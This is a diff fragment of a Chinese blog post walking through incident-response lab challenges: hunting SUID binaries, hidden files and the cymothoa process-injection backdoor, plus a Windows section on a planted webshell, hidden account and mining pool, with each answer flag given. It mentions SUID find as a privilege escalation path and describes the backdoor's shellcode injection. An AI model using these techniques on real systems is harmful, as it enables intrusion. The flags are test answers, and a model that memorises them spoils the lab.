+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@xuanji:/tmp/.temp/libprocesshider# find / -user root -perm -4000 -print 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">/bin/mount
+</span></span><span class="line"><span class="cl">/bin/ping
+</span></span><span class="line"><span class="cl">/bin/ping6
+</span></span><span class="line"><span class="cl">/bin/su
+</span></span><span class="line"><span class="cl">/bin/umount
+</span></span><span class="line"><span class="cl">/usr/bin/chfn
+</span></span><span class="line"><span class="cl">/usr/bin/chsh
+</span></span><span class="line"><span class="cl">/usr/bin/find
+</span></span><span class="line"><span class="cl">/usr/bin/gpasswd
+</span></span><span class="line"><span class="cl">/usr/bin/newgrp
+</span></span><span class="line"><span class="cl">/usr/bin/passwd
+</span></span><span class="line"><span class="cl">/usr/bin/sudo
+</span></span><span class="line"><span class="cl">/usr/lib/eject/dmcrypt-get-device
+</span></span><span class="line"><span class="cl">/usr/lib/openssh/ssh-keysign
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>对比GTFO，find命令能提权</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/usr/bin/find --&gt; 7fd5884f493f4aaf96abee286ee04120
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{7fd5884f493f4aaf96abee286ee04120}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="黑客尝试注入恶意代码的工具完整路径md5">黑客尝试注入恶意代码的工具完整路径md5
+</h3><p>进行隐藏文件扫描</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@xuanji:/tmp/.temp/libprocesshider# find / -type f -name <span class="s2">&#34;.*&#34;</span> 2&gt;/dev/null <span class="p">|</span> grep -v <span class="s2">&#34;^\/sys\/&#34;</span>
+</span></span><span class="line"><span class="cl">/etc/.pwd.lock
+</span></span><span class="line"><span class="cl">/etc/cron.d/.placeholder
+</span></span><span class="line"><span class="cl">/etc/cron.daily/.placeholder
+</span></span><span class="line"><span class="cl">/etc/cron.hourly/.placeholder
+</span></span><span class="line"><span class="cl">/etc/cron.monthly/.placeholder
+</span></span><span class="line"><span class="cl">/etc/cron.weekly/.placeholder
+</span></span><span class="line"><span class="cl">/etc/init.d/.legacy-bootordering
+</span></span><span class="line"><span class="cl">/etc/skel/.bash_logout
+</span></span><span class="line"><span class="cl">/etc/skel/.bashrc
+</span></span><span class="line"><span class="cl">/etc/skel/.profile
+</span></span><span class="line"><span class="cl">/etc/mysql/conf.d/.keepme
+</span></span><span class="line"><span class="cl">/home/ctf/.bash_logout
+</span></span><span class="line"><span class="cl">/home/ctf/.bashrc
+</span></span><span class="line"><span class="cl">/home/ctf/.profile
+</span></span><span class="line"><span class="cl">/home/ctf/.bash_history
+</span></span><span class="line"><span class="cl">/root/.bashrc
+</span></span><span class="line"><span class="cl">/root/.profile
+</span></span><span class="line"><span class="cl">/root/.bash_history
+</span></span><span class="line"><span class="cl">/root/.viminfo
+</span></span><span class="line"><span class="cl">/tmp/.temp/libprocesshider/.gitignore
+</span></span><span class="line"><span class="cl">/.dockerenv
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>没有可疑的，接着扫描隐藏目录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@xuanji:/tmp/.temp/libprocesshider# find / -type d -name <span class="s2">&#34;.*&#34;</span> 2&gt;/dev/null <span class="p">|</span> grep -v <span class="s2">&#34;^\/sys\/&#34;</span>
+</span></span><span class="line"><span class="cl">/opt/.cymothoa-1-beta
+</span></span><span class="line"><span class="cl">/root/.ssh
+</span></span><span class="line"><span class="cl">/root/.cache
+</span></span><span class="line"><span class="cl">/run/secrets/kubernetes.io/serviceaccount/..2025_11_10_06_46_12.3744006537
+</span></span><span class="line"><span class="cl">/tmp/.temp
+</span></span><span class="line"><span class="cl">/tmp/.temp/libprocesshider/.git
+</span></span><span class="line"><span class="cl">/usr/share/php/.registry
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>第一个很可疑</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@xuanji:/opt/.cymothoa-1-beta# ls -alih
+</span></span><span class="line"><span class="cl">total 580K
+</span></span><span class="line"><span class="cl"> <span class="m">9832207</span> drwxr-xr-x. <span class="m">3</span> ctf  <span class="m">1000</span>  16K Aug  <span class="m">3</span>  <span class="m">2023</span> .
+</span></span><span class="line"><span class="cl"> <span class="m">3129178</span> drwxr-xr-x. <span class="m">1</span> root root   <span class="m">30</span> Aug  <span class="m">3</span>  <span class="m">2023</span> ..
+</span></span><span class="line"><span class="cl"> <span class="m">9832208</span> -rw-r--r--. <span class="m">1</span> ctf  <span class="m">1000</span>  <span class="m">137</span> May <span class="m">24</span>  <span class="m">2011</span> Makefile
+</span></span><span class="line"><span class="cl"> <span class="m">9832209</span> -rwxr-xr-x. <span class="m">1</span> root root  14K Aug  <span class="m">3</span>  <span class="m">2023</span> bgrep
+</span></span><span class="line"><span class="cl"> <span class="m">9832210</span> -rw-r--r--. <span class="m">1</span> root root 4.3K May  <span class="m">5</span>  <span class="m">2011</span> bgrep.c
+</span></span><span class="line"><span class="cl"> <span class="m">9832211</span> -rw-------. <span class="m">1</span> root root 412K Aug  <span class="m">3</span>  <span class="m">2023</span> core
+</span></span><span class="line"><span class="cl"> <span class="m">9832212</span> -rwxr-xr-x. <span class="m">1</span> root root  30K Aug  <span class="m">3</span>  <span class="m">2023</span> cymothoa
+</span></span><span class="line"><span class="cl"> <span class="m">9832213</span> -rw-r--r--. <span class="m">1</span> ctf  <span class="m">1000</span>  12K Jul <span class="m">27</span>  <span class="m">2011</span> cymothoa.c
+</span></span><span class="line"><span class="cl"> <span class="m">9832214</span> -rw-r--r--. <span class="m">1</span> ctf  <span class="m">1000</span> 4.9K Jul <span class="m">27</span>  <span class="m">2011</span> cymothoa.h
+</span></span><span class="line"><span class="cl"> <span class="m">9832215</span> -rwxr-xr-x. <span class="m">1</span> root root 1.3K May  <span class="m">5</span>  <span class="m">2011</span> hexdump_to_cstring.pl
+</span></span><span class="line"><span class="cl"><span class="m">17877868</span> drwxr-xr-x. <span class="m">2</span> root root  16K Jul <span class="m">27</span>  <span class="m">2011</span> payloads
+</span></span><span class="line"><span class="cl"> <span class="m">9832216</span> -rw-r--r--. <span class="m">1</span> ctf  <span class="m">1000</span>  16K Jul <span class="m">27</span>  <span class="m">2011</span> payloads.h
+</span></span><span class="line"><span class="cl"> <span class="m">9832217</span> -rw-r--r--. <span class="m">1</span> ctf  <span class="m">1000</span> 4.9K May <span class="m">24</span>  <span class="m">2011</span> personalization.h
+</span></span><span class="line"><span class="cl"> <span class="m">9832218</span> -rwxr-xr-x. <span class="m">1</span> root root  <span class="m">964</span> May <span class="m">24</span>  <span class="m">2011</span> syscall_code.pl
+</span></span><span class="line"><span class="cl"> <span class="m">9832219</span> -rw-r--r--. <span class="m">1</span> root root 4.9K May <span class="m">24</span>  <span class="m">2011</span> syscalls.txt
+</span></span><span class="line"><span class="cl"> <span class="m">9832220</span> -rwxr-xr-x. <span class="m">1</span> root root 9.0K Aug  <span class="m">3</span>  <span class="m">2023</span> udp_server
+</span></span><span class="line"><span class="cl"> <span class="m">9832221</span> -rw-r--r--. <span class="m">1</span> root root 1.4K May <span class="m">24</span>  <span class="m">2011</span> udp_server.c
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>cymothoa</code>是一款隐秘的后门工具。它通过向目标主机活跃的进程注入shellcode，从而获取和原进程相同的权限，工具最大的优点就是不创建新的进程，不容易被发现</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/opt/.cymothoa-1-beta/cymothoa --&gt; 087c267368ece4fcf422ff733b51aed9
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{087c267368ece4fcf422ff733b51aed9}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="使用命令运行-xxx-执行该文件--将查询的-exec-值-作为flag提交-flagxxxxxxxxx">使用命令运行 ./x.xx 执行该文件  将查询的 Exec****** 值 作为flag提交 flag{/xxx/xxx/xxx}
+</h3><p>执行前面找到的1.py</p>
+<p>然后看一下进程pid</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@xuanji:/opt/.cymothoa-1-beta# python3 /tmp/.temp/libprocesshider/1.py
+</span></span><span class="line"><span class="cl">root@xuanji:/opt/.cymothoa-1-beta# ps -ef <span class="p">|</span> grep <span class="s2">&#34;1.py&#34;</span>
+</span></span><span class="line"><span class="cl">root         <span class="m">442</span>       <span class="m">1</span>  <span class="m">0</span> 07:10 ?        00:00:00 python3 /tmp/.temp/libprocesshider/1.py
+</span></span><span class="line"><span class="cl">root         <span class="m">444</span>     <span class="m">404</span>  <span class="m">0</span> 07:11 pts/0    00:00:00 grep --color<span class="o">=</span>auto 1.py
+</span></span><span class="line"><span class="cl">root@xuanji:/opt/.cymothoa-1-beta# ll /proc/442/exe
+</span></span><span class="line"><span class="cl">lrwxrwxrwx. <span class="m">1</span> root root <span class="m">0</span> Nov <span class="m">10</span> 07:12 /proc/442/exe -&gt; /usr/bin/python3.4*
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{/usr/bin/python3.4}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>ll</code>命令就是<code>ls -l</code>,然后这个就是查询指向pid为442进程的连接</p>
+<p>当然这题也可以直接查看python3的路径</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@xuanji:/opt/.cymothoa-1-beta# which python3
+</span></span><span class="line"><span class="cl">/usr/bin/python3
+</span></span><span class="line"><span class="cl">root@xuanji:/opt/.cymothoa-1-beta# ls -l /usr/bin/python3
+</span></span><span class="line"><span class="cl">lrwxrwxrwx. <span class="m">1</span> root root <span class="m">9</span> Mar <span class="m">23</span>  <span class="m">2014</span> /usr/bin/python3 -&gt; python3.4
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="第四章-windows实战-emlog">第四章 windows实战-emlog
+</h2><h3 id="通过本地-pc-rdp到服务器并且找到黑客植入-shell将黑客植入-shell-的密码-作为-flag-提交">通过本地 PC RDP到服务器并且找到黑客植入 shell,将黑客植入 shell 的密码 作为 FLAG 提交;
+</h3><p>连接，打开phpstudy，上传D盾扫描后门</p>
+<p>找到shell.php</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{rebeyond}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="通过本地-pc-rdp到服务器并且分析黑客攻击成功的-ip-为多少将黑客-ip-作为-flag-提交">通过本地 PC RDP到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;
+</h3><p>查看apache日志，搜索shell.php</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{192.168.126.1}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="通过本地-pc-rdp到服务器并且分析黑客的隐藏账户名称将黑客隐藏账户名称作为-flag-提交">通过本地 PC RDP到服务器并且分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交;
+</h3><p>可以在计算机管理里面查看用户，也可以直接去注册表看用户，或者用windows日志分析工具一把梭</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{hacker138}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="通过本地-pc-rdp到服务器并且分析黑客的挖矿程序的矿池域名将黑客挖矿程序的矿池域名称作为仅域名flag-提交">通过本地 PC RDP到服务器并且分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;
+</h3><p>进到hacker138的目录中发现一个python编译的exe</p>
+<p>查看反编译源码得到地址</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{wakuang.zhigongshanfang.top}
+</span></span></code></pre></td></tr></table>
+</div>
 </div>
 </section>
 
@@ -2118,6 +2693,30 @@
     <h2 class="section-title">相关文章</h2>
     <div class="related-content">
         <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/vulnhub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/">
+        
+        
+            <div class="article-image">
+                <img src="/p/vulnhub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/1.b108e4e2fee91c5001428d9681d2a674.webp" 
+                        width="1200" 
+                        height="2640" 
+                        loading="lazy"
+                        alt="Featured image of post vulnhub靶机渗透"
+                        
+                        data-hash="md5-sQjk4v7pHFABQo2WgdKmdA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">vulnhub靶机渗透</h2>
+        </div>
+    </a>
+</article>
+
             
                 
 <article class="has-image">
@@ -2210,30 +2809,6 @@
 
         <div class="article-details">
             <h2 class="article-title">7.10bugkuawd</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/xctf%E5%88%B7%E9%A2%98/">
-        
-        
-            <div class="article-image">
-                <img src="/p/xctf%E5%88%B7%E9%A2%98/1.d1acd9aeeda77e13f854a6271e3d8a5f.webp" 
-                        width="5416" 
-                        height="2894" 
-                        loading="lazy"
-                        alt="Featured image of post xctf刷题"
-                        
-                        data-hash="md5-0azZru2nfhP4VKYnHj2KXw==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">xctf刷题</h2>
         </div>
     </a>
 </article>
